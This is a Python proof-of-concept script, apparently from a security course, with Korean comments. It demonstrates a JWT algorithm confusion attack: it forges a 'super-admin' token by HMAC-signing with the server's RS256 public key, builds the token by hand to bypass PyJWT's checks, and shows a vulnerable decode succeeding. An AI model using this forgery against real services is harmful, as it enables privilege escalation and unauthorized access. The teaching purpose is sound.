import jwt
import os
import json
import base64
import hmac
import hashlib
from datetime import datetime, timedelta

def scenario_description():
    """공격 시나리오를 터미널에 출력."""
    print("="*50)
    print("⚔️ 공격 시나리오: 알고리즘 혼동 (Algorithm Confusion Attack)")
    print("="*50)
    print("이 공격은 서버가 RS256(비대칭키)과 HS256(대칭키)을 모두 지원하면서,")
    print("토큰의 알고리즘('alg' 헤더)에 따라 검증 로직을 유연하게 변경할 때 발생할 수 있습니다.")
    print("\n1. 서버는 RS256 검증을 위해 'Public Key'를 외부에 공개합니다.")
    print("2. 공격자는 이 Public Key를 획득합니다.")
    print("3. 공격자는 토큰 헤더의 'alg'를 'HS256'으로 변경하고, 페이로드를 'admin' 권한으로 위조합니다.")
    print("4. 서명 시, **RS256의 Public Key를 HS256의 비밀 키(Secret Key)처럼 사용**하여 서명합니다.")
    print("5. 서버는 'alg'가 HS256이므로 Public Key를 비밀 키로 착각하여 서명을 검증하고, 공격은 성공합니다.")
    print("-" * 50)

def base64url_encode(data):
    """데이터를 Base64URL 형식으로 인코딩합니다."""
    return base64.urlsafe_b64encode(data).rstrip(b"=")

def run_poc():
    """개념 증명(Proof of Concept) 코드를 실행."""
    # 1. 공격자가 서버의 RS256 공개키를 획득했다고 가정
    public_key_path = "public_key.pem"
    if not os.path.exists(public_key_path):
        print(f"[ERROR] '{public_key_path}' not found.")
        print("Please generate RSA keys first using the OpenSSL commands mentioned below.")
        return

    with open(public_key_path, "rb") as f:
        public_key = f.read()

    print(f"[INFO] 1. Attacker obtained the server's public key:\n{public_key.decode(errors='ignore')[:70]}...\n")

    # 2. 'admin' 권한을 가진 위조된 페이로드 생성 (sub를 이메일 형식으로 수정)
    header = {"alg": "HS256", "typ": "JWT"}
    malicious_payload = {
        "sub": "admin@example.com",
        "role": "super-admin",
        "exp": int((datetime.utcnow() + timedelta(days=365)).timestamp())
    }
    print(f"[INFO] 2. Crafting malicious payload:\n{malicious_payload}\n")
    
    # 3. 헤더의 alg를 HS256으로, 페이로드는 위조 내용으로, 서명은 공개키로
    # PyJWT 라이브러리의 보안 검사를 우회하기 위해 토큰을 수동으로 생성.
    json_header = json.dumps(header, separators=(",", ":")).encode('utf-8')
    json_payload = json.dumps(malicious_payload, separators=(",", ":")).encode('utf-8')

    encoded_header = base64url_encode(json_header)
    encoded_payload = base64url_encode(json_payload)

    signing_input = encoded_header + b"." + encoded_payload
    signature = hmac.new(public_key, signing_input, hashlib.sha256).digest()
    encoded_signature = base64url_encode(signature)

    forged_token = (encoded_header + b"." + encoded_payload + b"." + encoded_signature).decode('utf-8')
    
    print(f"[SUCCESS] 3. Forged JWT token generated:\n{forged_token}\n")

    print("[CONCLUSION] 이 토큰을 서버로 보내면, 서버의 검증 로직이 취약할 경우 admin 권한을 탈취할 수 있습니다.")
    print("   -> 5주차에서 'RS256 알고리즘 강제 및 올바른 키 사용'으로 방어할 것입니다.")
    
    # (참고) 취약한 서버에서의 검증 시뮬레이션
    try:
        decoded_payload = jwt.decode(forged_token, key=public_key, algorithms=["HS256"])
        print("\n[SIMULATION] Server (vulnerable) decodes the token successfully:")
        print(decoded_payload)
    except Exception as e:
        print(f"\n[SIMULATION] Decoding failed unexpectedly: {e}")

if __name__ == "__main__":
    # 이 PoC를 실행하려면 먼저 RS256 키 쌍이 필요.
    # 터미널에서 아래 명령어로 키를 생성.
    # > openssl genpkey -algorithm RSA -out private_key.pem -pkeyopt rsa_keygen_bits:2048
    # > openssl rsa -pubout -in private_key.pem -out public_key.pem
    scenario_description()
    run_poc()
